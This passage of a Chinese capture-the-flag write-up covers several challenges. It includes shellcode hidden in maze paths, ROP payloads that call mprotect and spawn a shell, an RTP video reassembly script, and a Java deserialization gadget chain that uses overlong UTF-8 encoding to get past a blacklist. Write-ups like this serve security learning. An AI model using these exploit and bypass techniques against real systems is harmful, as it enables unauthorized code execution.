\u5BFC\u81F4\u6211 C \u4EE3\u7801\u91CC\u7684 bf_round \u62A5 assertion error \uFF0C\u56E0\u4E3A\u4E00\u5F00\u59CB\u91CC\u9762\u7684\u5FAA\u73AF\u8BBE\u7F6E\u4E3A 8 \u8F6E\uFF0C\u6700\u540E\u4E00\u8F6E (1 << 7) \u8F93\u5165\u8FDB\u53BB\u5728 ror \u65F6\u5019\u5C31\u9519\u4E86\uFF0C\u5BFC\u81F4\u4E4B\u540E\u6761\u4EF6\u9519\u8BEF\u3002\u627E\u5230\u539F\u56E0\u540E\u5C31\u6539\u6210 7 \u8F6E\uFF0C\u6CA1\u95EE\u9898\u4E86\u3002\u5F53\u7136\u5B9E\u9645\u4E0A\u5E94\u8BE5\u662F shr \uFF08\u56E0\u4E3A sar \u89E3\u4E0D\u51FA\u6765\uFF09\uFF0Cz3 \u89E3\u7684\u65F6\u5019 ror \u91CC\u8981\u7528 LShR

## pwn

### MazeCodeV1

\u5305\u88F9\u5728maze\u9898\u91CC\u7684shellcode\u7F16\u7A0B\u9898v1

\u672C\u9898\u7684\u8FF7\u5BAB\u662F\u56FA\u5B9A\u7684\uFF0C\u7136\u540E\u8D70\u5B8C\u8FF7\u5BAB\u7684\u8DEF\u5F84\u4F5C\u4E3Ashellcode\u4F20\u5165\u6267\u884C\uFF08\u5373\u6BCF\u4E2A\u8F93\u5165\u7684\u5B57\u8282\u6A214\u4F5C\u4E3A\u4E0A\u4E0B\u5DE6\u53F3\u56DB\u4E2A\u65B9\u5411\uFF09\uFF0C\u4F46\u662F\u5728\u8DEF\u5F84\u4E2D\u5206\u6563\u5B8C\u6574\u7684getshell\u7684shellcode\u786E\u5B9E\u4E0D\u597D\u6784\u9020\uFF1B\u4F46\u5728\u51FA\u9898\u4EBA\u653E\u51FA\u201C\u6784\u9020\u4E00\u6B21\u65B0\u8BFB\u5165\u201D\u7684hint\u601D\u8DEF\u540E\u786E\u5B9E\u6784\u9020\u5C31\u7B80\u77ED\u4E86\u5F88\u591A\u4E86

\`\`\`
syscall(sys_read, bss, nbytes) -> ret -> mprotect(bss,0x1000,7) -> getshell_shellcode
                                           \u2B06\u2B06\u2B06\u2B06\u2B06\u2B06\u2B06ROP\u2B06\u2B06\u2B06\u2B06\u2B06\u2B06

\`\`\`

\u53EA\u9700\u8981\u628A\u6784\u9020\u4E00\u6B21\u8BFB\u53D6\u5230bss\u7684\u90E8\u5206\u5206\u6563\u5230\u8D70\u8FF7\u5BAB\u7684\u8DEF\u5F84\u4E2D\u5373\u53EF\uFF0C\u5177\u4F53\u4E0A\u6765\u8BF4\u662F\uFF1A

\`\`\`
    "mov esi,0x404000",
    "mov dh,0x40",
    "mov esp,0x404000",
    "syscall",
    "mov dh,0",
    "mov dl,7",
    "ret"

\`\`\`

\u6700\u7EC8\u6784\u9020\u7684\u8FF7\u5BAB\u8DEF\u5F84\u5982\u4E0B\`path_string\`\uFF0C\u6CE8\u610F\u5230\\x90~\\x93\u5BF9\u5E94\u7684\u5355\u5B57\u8282\u6307\u4EE4\u80FD\u591F\u7528\u6765\u586B\u5145\u5176\u4F59\u76840~3\uFF1A

\`\`\`
'''
\u2B06 \u4F590
\u2B07 \u4F592
\u2B05 \u4F593
\u2192 \u4F591
'''

path_string = b"1111221100112211221100111122112222112222\\xbe\\x00@@\\x0022\\xb6@222110011112211221100110000001100001100001122222\\xbc\\x00@@\\x00222222223\\x0f\\x05322\\xb6\\x002\\xb2\\x0732211223\\xc31333223322221122333322111122110011112222332211222233003322221111"
path_string = path_string.replace(b"0", b"\\x90").replace(b"1", b"\\x91").replace(b"2", b"\\x92").replace(b"3", b"\\x93")

\`\`\`

\u4E4B\u540E\u518D\u53D1\u9001\u540E\u8FB9\u7684mprotect\u4E0Egetshell\u90E8\u5206\uFF1A

\`\`\`
p_rdi_rbp_r = 0x0000000000401760 #: pop rdi ; pop rbp ; ret
p_rsi_r15_rbp_r = 0x000000000040175e #: pop rsi ; pop r15 ; pop rbp ; ret

shellcode = asm(shellcraft.sh())

shellcode_addr = 0x404000 + 0x40 + 0x8

payload2 = b"".join([
    p64(p_rdi_rbp_r),
    p64(0x404000),
    p64(0xdeadbeef),
    p64(p_rsi_r15_rbp_r),
    p64(0x1000),
    p64(0xdeadbeef),
    p64(0xdeadbeef),
    p64(e.plt["mprotect"]),
    p64(shellcode_addr),
    shellcode,
]
)

\`\`\`

\u7136\u540E\u83B7\u53D6flag\uFF1A

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=NDI2ZmRmYzc4OTRjZTdlZWFhNGYyN2E4ODQ5NzJiOWFfS05tOU5TREJpdWJnbllEOXRJR1Fpa0x3T2dWaFo5cnZfVG9rZW46VkFSQmIzQmdsbzZHZlF4amtMcWNRTkJYbmtoXzE3MzI1MzYzMTU6MTczMjUzOTkxNV9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=NDI2ZmRmYzc4OTRjZTdlZWFhNGYyN2E4ODQ5NzJiOWFfS05tOU5TREJpdWJnbllEOXRJR1Fpa0x3T2dWaFo5cnZfVG9rZW46VkFSQmIzQmdsbzZHZlF4amtMcWNRTkJYbmtoXzE3MzI1MzYzMTU6MTczMjUzOTkxNV9WNA)

### MazeCodeV2

\u5305\u88F9\u5728maze\u9898\u91CC\u7684shellcode\u7F16\u7A0B\u9898v2\uFF1B\u7406\u8BBA\u4E0A\u89E3\u51FA\u4E86v1\uFF0C\u7B2C\u4E8C\u9898\u5C31\u662F\u5C06v1\u6D41\u7A0B\u5B8C\u6210\u81EA\u52A8\u5316\u7684\u8FC7\u7A0B\u3002

\u9996\u5148\u662F\u8FF7\u5BAB\u8DEF\u5F84\u627E\u5BFB\u81EA\u52A8\u5316\uFF08bfs\uFF09\uFF0C\u8FD9\u91CCfind_path\u7684\u8FD4\u56DE\u503C\u5373\u4E3A[0-3]\u7684\u5B57\u7B26\u4E32\u5E8F\u5217\u4EE3\u8868\u8FF7\u5BAB\u8DEF\u5F84\uFF1A

\`\`\`
def find_start_and_end(maze):
    start, end = None, None
    for y, row in enumerate(maze):
        for x, cell in enumerate(row):
            if cell == 'S':
                start = (x, y)
            elif cell == 'T':
                end = (x, y)
    return start, end

def bfs(maze, start, end):
    queue = deque([start])
    visited = set()
    visited.add(start)
    parent = {start: None}

    while queue:
        current = queue.popleft()
        if current == end:
            break
        x, y = current

        for dx, dy in [(-1, 0), (1, 0), (0, -1), (0, 1)]:
            nx, ny = x + dx, y + dy
            if 0 <= nx < len(maze[0]) and 0 <= ny < len(maze) and maze[ny][nx] in (' ', 'T') and (nx, ny) not in visited:
                queue.append((nx, ny))
                visited.add((nx, ny))
                parent[(nx, ny)] = (x, y)

    path = []
    step = end
    while step:
        path.append(step)
        step = parent[step]
    path.reverse()

    return path

def path_to_string(path):
    direction_map = {
        (-1, 0): '3',  # Left
        (0, 1): '2',   # Down
        (1, 0): '1',   # Right
        (0, -1): '0'   # Up
    }

    path_string = ''
    for i in range(1, len(path)):
        x1, y1 = path[i-1]
        x2, y2 = path[i]
        dx = x2 - x1
        dy = y2 - y1
        path_string += direction_map[(dx, dy)]

    return path_string

def find_path(maze):
    start, end = find_start_and_end(maze)
    if not start or not end:
        print("Start or end point not found in the maze.")
        sys.exit(1)

    path = bfs(maze, start, end)
    if path:
        path_string = path_to_string(path)
        print(path_string)
        return path_string
    else:
        print("No path found from start to end.")

\`\`\`

\u7136\u540E\u662F\u5173\u952E\u7684\u5206\u6563v1\u4E2D\u7684\u6784\u9020\u8BFB\u53D6\u7684\u81EA\u52A8\u5316\uFF0C\u6CE8\u610F\u4E0B\u8FF0\u7684\u6BCF\u884C\u7684\u6700\u540E\u7684[0-3]\u6784\u6210\u5217\u8868\u7684\u5373\u4E3A\u6BCF\u4E2A\u6307\u4EE4\u8981\u5728\u8FF7\u5BAB\u8DEF\u5F84\u4E2D\u5BFB\u627E\u7684\u5339\u914D\uFF1A

\`\`\`
b'\\xbe\\x00@@\\x00' mov esi,0x404000 [2, 0, 0, 0, 0]
b'\\xb6@' mov dh,0x40 [2, 0]
b'\\xbc\\x00@@\\x00' mov esp,0x404000 [0, 0, 0, 0, 0]
b'\\x0f\\x05' syscall [3, 1]
b'\\xb6\\x00' mov dh,0 [2, 0]
b'\\xb2\\x07' mov dl,7 [2, 3]
b'\\xc3' ret [3]

\`\`\`

\u603B\u7ED3\u4E00\u4E0B\u4E0A\u9762\u4EE3\u7801\u7684\u4E00\u4E9B\u7EA6\u675F\uFF1A

- syscall\u53D1\u751F\u5728ret\u4E4B\u524D
- syscall\u548Cret\u4E4B\u95F4set rdx=7
- syscall\u524D\u8BBE\u7F6Ersi\u548Crdx\uFF0Crdx\u8DB3\u591F\u5927\u5C31\u884C
- \u8BBE\u7F6Ersp\u8FDB\u884C\u6808\u8FC1\u79FB\uFF0C\u8FD9\u4E2A\u53D1\u751F\u5728ret\u4E4B\u524D\u5C31\u884C

\u5177\u4F53\u7684\u7EA6\u675F\u53EF\u4EE5\u7528\u8FD9\u4E2A\u56FE\u603B\u7ED3\u4E0B\uFF1A

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=NTkzZTM5NzNjNzI0MjZjYjdmMmY3MmJjZjNiOWU5ZjRfN3dQVDg4M3RGSUt2VVNwT25OZDVLZFBLRUVwdG1OSlBfVG9rZW46VWNRTmJmZnl4bzFLVmp4V0JDUmNJTnhlbkNiXzE3MzI1MzYzMTU6MTczMjUzOTkxNV9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=NTkzZTM5NzNjNzI0MjZjYjdmMmY3MmJjZjNiOWU5ZjRfN3dQVDg4M3RGSUt2VVNwT25OZDVLZFBLRUVwdG1OSlBfVG9rZW46VWNRTmJmZnl4bzFLVmp4V0JDUmNJTnhlbkNiXzE3MzI1MzYzMTU6MTczMjUzOTkxNV9WNA)

\u4E5F\u5C31\u662Fread\u5199\u5165\u7684\u5730\u5740\u8981\u6BD4\u6808\u8FC1\u79FB\u7684\u76EE\u6807\u5730\u5740\u5C0F\u3002

\u5E76\u4E14\u7531\u4E8E\u4E00\u6B651\u53EF\u4EE5\u66FF\u6362\u6210\u4E09\u6B65131\u8FD9\u6837\u7684\u6027\u8D28\uFF0C\u8FDE\u7EED\u4E24\u4E2A1/3\u30010/2\u53EA\u8981\u51FA\u73B0\u5176\u4E2D\u4E00\u4E2A\u5C31\u53EF\u4EE5\u76F8\u4E92\u751F\u6210\u3002

\u7136\u540E\u81EA\u52A8\u5316\u5B9E\u73B0\u7684\u601D\u60F3\u662F\u5148\u505A\u52A0\u6CD5\uFF0C\u4F8B\u5982\u8981\u5BFB\u627E\`mov esi,0x404000\`\u5BF9\u5E94\u7684[2, 0, 0, 0, 0]\uFF0C\u7406\u8BBA\u4E0A\u4E0A\u8FF0bfs\u641C\u7D22\u51FA\u6765\u7684\u8DEF\u5F84\u4E0D\u53EF\u80FD\u5B58\u5728\u8FD9\u4E2A\u5E8F\u5217\uFF08\u56E0\u4E3A2\u548C0\u4EE3\u8868\u7684\u79FB\u52A8\u65B9\u5411\u76F8\u53CD\uFF09\uFF0C\u4F46\u662F\u53EF\u4EE5\u76F4\u63A5\u5339\u914D0000\u8FD9\u79CD\u8DEF\u5F84\uFF0C\u5C06\u5176\u66FF\u6362\u4E3A020000\uFF08\u5982\u679C\u8DEF\u5F84\u4E2D\u67092222\u5C31\u66FF\u6362\u6210222200002222\uFF09\uFF1B\u5176\u5B83\u6A21\u5F0F\u4E32\u4E5F\u540C\u7406\uFF0C\u4E4B\u540E\u518D\u66FF\u6362\u6210\u4E0A\u8FF0\u6307\u4EE4\u5BF9\u5E94\u7684\u5B57\u7B26\u4E32\u3002\u4E0B\u8FF0\u5C31\u662Fexp\u4E2D\u7684\u8FD9\u4E2A\u505A\u52A0\u6CD5\u7684\u90E8\u5206\uFF0C\u601D\u8DEF\u662F\u8F93\u5165\u8FF7\u5BAB\u8DEF\u5F84\u5B57\u7B26\u4E32\uFF0C\u8F93\u51FA\u589E\u52A0\u5339\u914D\u66FF\u6362\u540E\u7684\u8DEF\u5F84\u7ED3\u679C\uFF1B\u6CE8\u610F\u8FD9\u91CC\u662F\u76F4\u63A5\u57280000->020000\u8FD9\u6B65\u65F6\u76F4\u63A5\u5C06\u5176\u4E2D\u768420000\u66FF\u6362\u6210\u4E86\`mov esi,0x404000\`\uFF0C\u5176\u4F59\u6307\u4EE4\u540C\u7406\u3002\u987A\u5E8F\u4E0A\uFF0C\u4F18\u5148\u627E\u77ED\u7684\u3001\u7B80\u5355\u7684\u6307\u4EE4\uFF0C\u8BD5\u4E86\u51E0\u7EC4\u6570\u636E\uFF0C\u6700\u540E\u627Eset esp\u8FD9\u79CD\u987A\u5E8F\u65E0\u5173\u7684\u6307\u4EE4\u7684\u65F6\u5019\uFF0C\u90FD\u8FD8\u5269\u4E0B\u4E00\u5927\u5806\uFF0C\u6240\u4EE5\u653E\u5728\u6700\u540E\u627E\u3002

\`\`\`
def gen_longer_path(path):
    rem=path.encode()
    info(f"ori rem: {rem}")
    # set rdx

    l=len(rem)
    for i in range(l):
        if rem[i:i+1]==b"2":
            s0=rem[0:i]+b"\\xb6@2"
            rem=rem[i+1:]
            break
        if rem[i:i+1]==b"0":
            s0=rem[0:i]+b"0\\xb6@"
            rem=rem[i+1:]
            break
    print("set rdi:",s0)

    # set rsi
    l=len(rem)
    for i in range(l):
        if rem[i:i+4]==b"0000":
            s1=rem[0:i]+b"0\\xbe\\x00@@\\x00"
            rem=rem[i+4:]
            break
        if rem[i:i+4]==b"2222":
            s1=rem[0:i]+b"222\\xbe\\x00@@\\x002222"
            rem=rem[i+4:]
            break
    print("set rsi:",s1)

    # syscall

    l=len(rem)
    for i in range(l):
        if rem[i:i+1]==b"1":
            s2=rem[0:i]+b"1\\x0f\\x05"
            rem=rem[i+1:]
            break
        if rem[i:i+1]==b"3":
            s2=rem[0:i]+b"\\x0f\\x053"
            rem=rem[i+1:]
            break
    print("syscall:",s2)

    # set dh

    l=len(rem)
    for i in range(l):
        if rem[i:i+1]==b"2":
            s3=rem[0:i]+b"\\xb6\\x002"
            rem=rem[i+1:]
            break
        if rem[i:i+1]==b"0":
            s3=rem[0:i]+b"0\\xb6\\x00"
            rem=rem[i+1:]
            break
    print("set dh:",s3)

    # set dl

    l=len(rem)
    for i in range(l):
        if rem[i:i+2]==b"23":
            s4=rem[0:i] + b"\\xb2\\x07"
            rem=rem[i+2:]
            break
    print("set dh:",s4)

    #set rsp

    l=len(rem)
    for i in range(l):
        if rem[i:i+5]==b"00000":
            s5=rem[0:i] + b"\\xbc\\x00@@\\x00"
            rem=rem[i+5:]
            break
        if rem[i:i+5]==b"22222":
            info("???")
            s5=rem[0:i]+b"22222\\xbc\\x00@@\\x0022222"
            rem=rem[i+5:]
            break
    print("set rsp:",s5)
    #ret

    l=len(rem)
    for i in range(l):
        if rem[i:i+1]==b"3":
            se=rem[0:i] + b"\\xc3"
            rem=rem[i+1:]
            break
        if rem[i:i+1]==b"1":
            se=rem[0:i]+b"1\\xc31"
            rem=rem[i+1:]
            break
    print("ret:",se)

    print("rem:",rem)

    stot=s0+s1+s2+s3+s4+s5+se+rem
    print("stot: ", stot)
    return stot

\`\`\`

\u53CD\u6B63\u6700\u540E\u8DEF\u5F84\u957F\u5EA6\u80AF\u5B9A\u5C0F\u4E8E512byte\u5C31\u597D\uFF1B\u53E6\u5916\u8FD8\u6709\u4E00\u4EF6\u4E8B\u60C5\u662F\u7528\u6765\u66FF\u6362\u4F59\u4E0B\u76840~3\u7684\\x90~\\x93\u5BF9\u5E94\u7684\u5355\u5B57\u8282\u6307\u4EE4\u4E2D\uFF0C\u5BF9\u5E942\u7684xchg   edx, eax\u4F1A\u5F71\u54CD\u4E2D\u9014\u7684rdx\u7684\u8D4B\u503C\uFF0C\u53EF\u80FD\u4F1A\u5BFC\u81F4syscall\u548C\u6700\u540Eret\u7684\u65F6\u5019rax\u548Crdx\u91CC\u7684\u503C\u53CD\u4E86\uFF0C\u4F46\u5C062\u90FD\u66FF\u6362\u4E3A"\\x92\\x90\\x92"\u5C31\u6CA1\u6709\u95EE\u9898\u4E86\uFF08\u8FF7\u5BAB\u91CC\u82E5\u80FD\u5411\u4E0B\u8D70\u4E00\u6B65\u7684\u8BDD\uFF0C\u90A3\u5FC5\u5B9A\u4E5F\u80FD\u2B07\u2B06\u2B07\uFF0C\u8FD9\u6837edx\u4E0Eeax\u4EA4\u6362\u4E24\u6B21\u5C31\u6CA1\u6709\u5F71\u54CD\u4E86\uFF09\uFF0C\u4E0Ev1\u4E0D\u540C\u7684\u6700\u7EC8\u7684\u586B\u5145\u66FF\u6362\u5982\u4E0B\uFF1A

\`\`\`
path = path.replace(b"0", b"\\x90").replace(b"1", b"\\x91").replace(b"2", b"\\x92\\x90\\x92").replace(b"3", b"\\x93")

\`\`\`

\u5176\u4F59payload\u6784\u9020\u548Cv1**\u5B8C\u5168\u4E00\u81F4\u3002**\u6700\u7EC8flag\u83B7\u53D6\u5982\u4E0B\uFF1A

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=NDcwOGQ4ZmVjMzExMDk0NGQxMzA5ZGNmNjhjMjQ1NTNfeHdEQXpDMmU1V0g0NU9wVnlTbTcwSGpmYWRlZmQ3SFFfVG9rZW46Sjk0b2JkNmM5b3RNYWV4RDJTNWNYMHhrblZjXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=NDcwOGQ4ZmVjMzExMDk0NGQxMzA5ZGNmNjhjMjQ1NTNfeHdEQXpDMmU1V0g0NU9wVnlTbTcwSGpmYWRlZmQ3SFFfVG9rZW46Sjk0b2JkNmM5b3RNYWV4RDJTNWNYMHhrblZjXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA)

## misc

### checkin

flag{\u6BD4\u8D5BQQ\u7FA4\u53F7}

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=OTQ0NDU5MDIyNmQwYzUwZGVlYmRjYjczNjdlOTgzMjVfSXBheUZ1Qkp5SlhpMjlrdXFIZmdPT2cxTHo1enE5Y0FfVG9rZW46QWJteWJicHp4b29BZ3R4Z2xDZGNYQjQ1bm1jXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=OTQ0NDU5MDIyNmQwYzUwZGVlYmRjYjczNjdlOTgzMjVfSXBheUZ1Qkp5SlhpMjlrdXFIZmdPT2cxTHo1enE5Y0FfVG9rZW46QWJteWJicHp4b29BZ3R4Z2xDZGNYQjQ1bm1jXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA)

### **flag_video_version**

\u6253\u5F00pcapng\u6587\u4EF6\uFF0C\u770B\u5230\u6709\u5F88\u591Audp\u6D41\u91CF\uFF0C\u4E2D\u95F4\u5076\u5C14\u6709\u4E00\u4E9BIP\u5305\uFF0C\u52A0\u4E0A\u9898\u76EE\u6240\u8BF4\u548C\u89C6\u9891\u76F8\u5173\uFF0C\u6240\u4EE5\u731C\u6D4B\u662F\u548C\u89C6\u9891\u6709\u5173\u7684\u534F\u8BAE

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=YjI1YjFmMWZkOGM3ZjM0NzJmZDM5ODJlMGVlYjZjMzNfbUxBd3ZZTkRBTkVTYWZCR3VSTFFyZTJYbUtyd0Vqb0NfVG9rZW46U0dzOGJGNzVWb2Rhc0t4aldXY2MwcmszbmVNXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=YjI1YjFmMWZkOGM3ZjM0NzJmZDM5ODJlMGVlYjZjMzNfbUxBd3ZZTkRBTkVTYWZCR3VSTFFyZTJYbUtyd0Vqb0NfVG9rZW46U0dzOGJGNzVWb2Rhc0t4aldXY2MwcmszbmVNXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA)

\u70B9\u5F00\u5177\u4F53\u7684\u534F\u8BAE\u6570\u636E\uFF0C

\`\`\`
806004bc00000000deadbeef00000001019f2d744256ff00000300000300190a56c65e11fbcac7d73330270000030000030000030001e9

\`\`\`

\u53EF\u4EE5\u53D1\u73B0\uFF0C\u90FD\u662F\u5F62\u5982\`8060xxxx00000000deadbeef\`\u7684\u683C\u5F0F\uFF0C\u53EF\u4EE5\u8054\u60F3\u5230RTP\u6570\u636E\uFF0C\u56E0\u6B64\u5C06\u5176decode as RTP

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmE5ZDIxYmYzYTVmMmU3ZGRjYTNjNDc0ZGI2NWVhYTdfM0xkOEh4NmxLanZ6eFA4VDJPSUxrYkNQS0hHS2R6dmJfVG9rZW46UjczcmJmT1Zub1lhbzh4Ujd4d2Nza0dZbmtmXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmE5ZDIxYmYzYTVmMmU3ZGRjYTNjNDc0ZGI2NWVhYTdfM0xkOEh4NmxLanZ6eFA4VDJPSUxrYkNQS0hHS2R6dmJfVG9rZW46UjczcmJmT1Zub1lhbzh4Ujd4d2Nza0dZbmtmXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA)

\u4F46\u662F\u53D1\u73B0\u987A\u5E8F\u662F\u4E71\u7684\uFF0C\u5BFC\u81F4\u76F4\u63A5\u5BFC\u51FA\u7684\u60C5\u51B5\u4E0B\u5F97\u5230\u7684\u89C6\u9891\u662F\u6709\u95EE\u9898\u7684\uFF0C\u56E0\u6B64\u5199\u811A\u672C\u89E3\u51B3\u8BE5\u95EE\u9898\uFF1A

\`\`\`
_0= [
0x80, 0x60, 0x04, 0xbc, 0x00, 0x00, 0x00, 0x00,
0xde, 0xad, 0xbe, 0xef, 0x00, 0x00, 0x00, 0x01,
0x01, 0x9f, 0x2d, 0x74, 0x42, 0x56, 0xff, 0x00,
0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x19, 0x0a,
0x56, 0xc6, 0x5e, 0x11, 0xfb, 0xca, 0xc7, 0xd7,
0x33, 0x30, 0x27, 0x00, 0x00, 0x03, 0x00, 0x00,
0x03, 0x00, 0x00, 0x03, 0x00, 0x01, 0xe9 ]
....
_1245= [
0x80, 0x60, 0x02, 0x30, 0x00, 0x00, 0x00, 0x00,
0xde, 0xad, 0xbe, 0xef, 0x00, 0x00, 0x00, 0x01,
0x41, 0x9b, 0xbc, 0x49, 0xa8, 0x41, 0x6c, 0x99,
0x4c, 0x09, 0x6d, 0xff, 0x87, 0x00, 0x00, 0x03,
0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x25,
0x09, 0xe1, 0xd9, 0x4f, 0x37, 0xda, 0x03, 0x14,
0x51, 0x45, 0x70, 0x84, 0x8b, 0x00, 0x00, 0x03,
0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00,
0x1e, 0xb1 ]

f =open("1","ab")
for i inrange(1246):
    for j inrange(1246):
        lis =eval(f"_{j}")
        seq_num = (lis[2]<<8)+lis[3]
        if seq_num == i:
            f.write(bytes(lis[12:]))
            break

\`\`\`

\u6700\u4E0A\u9762\u7684\u6570\u636E\u662F\u4ECEwireshark\u91CC\u5BFC\u51FA\u7684\uFF0C\u4E4B\u540E\u7528potplayer\u6253\u5F00\u89C6\u9891\u770B\u5B8C\u5C31\u76F4\u63A5\u53EF\u4EE5\u62FF\u5230flag

## web

### ezjvav

\u9996\u5148\u8FDB\u5165\u73AF\u5883\uFF0C\u53D1\u73B0\u524D\u7AEF\u6709\u6DF7\u6DC6\u4EE3\u7801\uFF0C\u4F46\u662F\u5B9E\u9645\u4E0A\u8C03\u8BD5\u53D1\u73B0\u53EA\u8FDB\u884C\u4E86\u8BBF\u95EE/source\u7684\u64CD\u4F5C\u3002

\u6CA1\u6709\u53D1\u73B0\u5176\u4ED6\u8DEF\u7531\uFF0C\u56E0\u6B64\u4E3B\u8981\u5173\u6CE8jwt\u7684\u95EE\u9898\uFF0C\u540E\u6765\u6839\u636E\u9898\u76EE\u63D0\u793A\u5C1D\u8BD5\u51FA\u5176\u5BC6\u94A5\u4E3Ajsrc

\u4FEE\u6539jwt\u540E\u5F97\u5230jar\u5305\uFF0C\u53CD\u7F16\u8BD1\u5F97\u5230\u6E90\u7801\uFF0Cdump\u4E0B\u6765\uFF0C\u91CD\u70B9\u5173\u6CE8jsrc\u8DEF\u7531\uFF1A

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=YmIxYjYwZTA0MzRhYTBlODI4MTA0NDkwZTUxN2I5Yzlfa1NHTThvdjR6R2E5OE92V2cycTlqdEhYakMzM1U1S25fVG9rZW46TDhoQmJzb3lxb2YwNGZ4RFI5bWN4OXRlbnNoXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=YmIxYjYwZTA0MzRhYTBlODI4MTA0NDkwZTUxN2I5Yzlfa1NHTThvdjR6R2E5OE92V2cycTlqdEhYakMzM1U1S25fVG9rZW46TDhoQmJzb3lxb2YwNGZ4RFI5bWN4OXRlbnNoXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA)

\u8FD9\u91CC\u6709\u4E00\u4E2A\u6BD4\u8F83\u660E\u663E\u7684\u53CD\u5E8F\u5217\u5316\uFF0C\u8DDF\u8FDB**MyObjectInputStream\u548CByteCompare**

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ5ZmRjN2UxZjc4NDhjM2ZkNmQ1ZjMyYzlmOGZhODRfY3htMkFSenFDWngxYmM1YzdLdVRvalZZUmd2UEV6UDVfVG9rZW46UWp0dWJGMGpOb255OER4dVh6UWM5TlBVbkNlXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ5ZmRjN2UxZjc4NDhjM2ZkNmQ1ZjMyYzlmOGZhODRfY3htMkFSenFDWngxYmM1YzdLdVRvalZZUmd2UEV6UDVfVG9rZW46UWp0dWJGMGpOb255OER4dVh6UWM5TlBVbkNlXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA)

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=ODBhN2Y5ZmZjMGJhOTY1ZWE2N2VhMmUzNzQzN2QxMThfTk5PeE9IbEdNajdEMGdWSFdwcDR5VHFhSTRPbVZBQmJfVG9rZW46THp6bWJVYTVqb1FkOHF4YnZZbWNEM3pXbm1mXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=ODBhN2Y5ZmZjMGJhOTY1ZWE2N2VhMmUzNzQzN2QxMThfTk5PeE9IbEdNajdEMGdWSFdwcDR5VHFhSTRPbVZBQmJfVG9rZW46THp6bWJVYTVqb1FkOHF4YnZZbWNEM3pXbm1mXzE3MzI1MzYzNDA6MTczMjUzOTk0MF9WNA)

\u53EF\u4EE5\u770B\u5230\uFF0C\u8FD9\u91CC\u7528\u4E86\u9ED1\u540D\u5355\u7684\u65B9\u5F0F\uFF0Cban\u6389\u4E86\u4E00\u4E9B\u5E38\u7528\u53CD\u5E8F\u5217\u5316\u70B9\u3002\u503C\u5F97\u6CE8\u610F\u7684\u662FCompared\u90A3\u91CC\u548C\u524D\u9762\u662F\u5206\u5F00\u6821\u9A8C\u7684\uFF0C\u56E0\u6B64\u53EF\u4EE5\u7ED5\u8FC7\uFF0C\u7528java.util.HashMap\u548Ccom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u505A\u53CD\u5E8F\u5217\u5316\uFF0C\u4F46\u662F\u52A0\u4E0A\u4E00\u5C42overlong attack\u5373\u53EF\uFF0C\u4ECE\u7F51\u4E0A\u627Epoc\uFF0C\u4FEE\u6539\u4E00\u4E0B\u5982\u4E0B\uFF1A

\`\`\`
import com.sun.syndication.feed.impl.EqualsBean;
import ysoserial.payloads.util.Gadgets;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import java.io.*;
import java.util.Base64;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
/*    */ import java.io.IOException;
/*    */ import java.io.InputStream;
/*    */ import java.io.InvalidClassException;
/*    */ import java.io.ObjectInputStream;
/*    */ import java.io.ObjectStreamClass;
/*    */ import java.util.ArrayList;

class CustomObjectOutputStream extends ObjectOutputStream {

    public CustomObjectOutputStream(OutputStream out) throws IOException {
        super(out);
    }

    private static HashMap<Character, int[]>map;
    private static Map<Character,int[]>bytesMap=new HashMap<>();

    static {
map= new HashMap<>();
map.put('.', new int[]{0xc0, 0xae});
map.put(';', new int[]{0xc0, 0xbb});
map.put('$', new int[]{0xc0, 0xa4});
map.put('[', new int[]{0xc1, 0x9b});
map.put(']', new int[]{0xc1, 0x9d});
map.put('a', new int[]{0xc1, 0xa1});
map.put('b', new int[]{0xc1, 0xa2});
map.put('c', new int[]{0xc1, 0xa3});
map.put('d', new int[]{0xc1, 0xa4});
map.put('e', new int[]{0xc1, 0xa5});
map.put('f', new int[]{0xc1, 0xa6});
map.put('g', new int[]{0xc1, 0xa7});
map.put('h', new int[]{0xc1, 0xa8});
map.put('i', new int[]{0xc1, 0xa9});
